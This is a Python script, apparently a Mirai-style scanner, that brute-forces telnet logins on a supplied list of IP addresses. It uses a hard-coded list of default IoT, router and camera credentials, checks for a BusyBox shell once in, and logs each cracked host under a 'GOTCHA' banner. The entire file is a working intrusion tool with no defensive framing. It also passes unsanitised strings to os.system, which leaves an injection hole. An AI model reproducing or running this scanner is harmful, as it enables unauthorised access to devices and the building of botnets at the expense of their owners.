import threading
import sys, os, re, time, socket
from queue import Queue
from sys import stdout

if len(sys.argv) < 4:
    print("Usage: python "+sys.argv[0]+" <list> <threads> <output file>")
    sys.exit()

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

combo = [
    "admin:admin",
    "root:founder88",
    "root:hikvision",
    "root:hi3518",
    "admin:ipcam_rt5350",
    "root:Zte521",
    "root:grouter",
    "default:v2mprt",
    "default:vhd1206",
    "root:vertex25ektks123",
    "root:IPCam@sw",
    "root:hslwificam",
    "vstarcam2015:20150602",
    "root:zte9x15",
    "admin:dvr2580222",
    "root:D13hh[",
    "admin:CenturyL1nk",
    "admin:ZmqVfoSIP",
    "admin:vodafone",
    "root:GM8182",
    "admin:Uq-4GIt3M",
    "default:nmgx_wapia",
    "admin:samsung",
    "admin:QwestM0dem",
    "root:taZz@23495859",
    "root:zhongxing",
    "admin:netgear1",
    "root:hg2x0",
    "root:taZz@01",
    "root:cam1029",
    "root:tsgoingon",
    "root:dvr",
    "root:camera",
    "admin:/ADMIN/",
    "root:twe8ehome",
    "telnet:telnet",
    "vodafone:vodafone",
    "default:tlJwpbo6",
    "default:S2fGqNFs",
    "default:OxhlwSG8",
    "root:qwertyuiop",
    "root:uClinux",
    "telnetadmin:telnetadmin",
    "root:2011vsta",
    "root:fidel123"
]

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip.strip())
print("\n")

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).strip()
    def run(self):
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password = ""
            else:
                password = passwd.split(":")[1]
            if "n/a:" in passwd:
                username = ""
            else:
                username = passwd.split(":")[0]
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip, 23))
            except Exception:
                tn.close()
                break
            try:
                hoho = readUntil(tn, "ogin:")
                if "ogin" in hoho:
                    tn.send((username + "\n").encode())
                    time.sleep(2)
            except Exception:
                tn.close()
            try:
                hoho = readUntil(tn, "assword:")
                if "assword" in hoho:
                    tn.send((password + "\n").encode())
                    time.sleep(2)
            except Exception:
                tn.close()
            try:
                prompt = tn.recv(40960).decode()
                if ">" in prompt and "ONT" not in prompt:
                    try:
                        tn.send(b"cat | sh\n")
                        time.sleep(1)
                        success = False
                        timeout = 8
                        data = ["BusyBox", "Built-in"]
                        tn.send(b"sh\n")
                        time.sleep(1)
                        tn.send(b"busybox\r\n")
                        buf = ''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += tn.recv(40960).decode()
                            time.sleep(1)
                            for info in data:
                                if info in buf and "unrecognized" not in buf:
                                    success = True
                                    break
                    except:
                        pass
                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
                    try:
                        success = False
                        timeout = 8
                        data = ["BusyBox", "Built-in"]
                        tn.send(b"sh\n")
                        time.sleep(0.01)
                        tn.send(b"shell\n")
                        time.sleep(0.01)
                        tn.send(b"help\n")
                        time.sleep(0.01)
                        tn.send(b"busybox\r\n")
                        buf = ''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += tn.recv(40960).decode()
                            time.sleep(0.01)
                            for info in data:
                                if info in buf and "unrecognized" not in buf:
                                    success = True
                                    break
                    except:
                        pass
                else:
                    tn.close()
                if success == True:
                    try:
                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file)
                        print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
                        tn.close()
                        break
                    except:
                        tn.close()
                tn.close()
            except Exception:
                tn.close()

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024).decode(errors='ignore')
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
    try:
        while True:
            IP = queue.get()
            thread = router(IP)
            thread.start()
            queue.task_done()
            time.sleep(0.2)
    except Exception as e:
        print(f"Worker exception: {e}")

for l in range(threads):
    t = threading.Thread(target=worker)
    t.start()
    time.sleep(0.01)
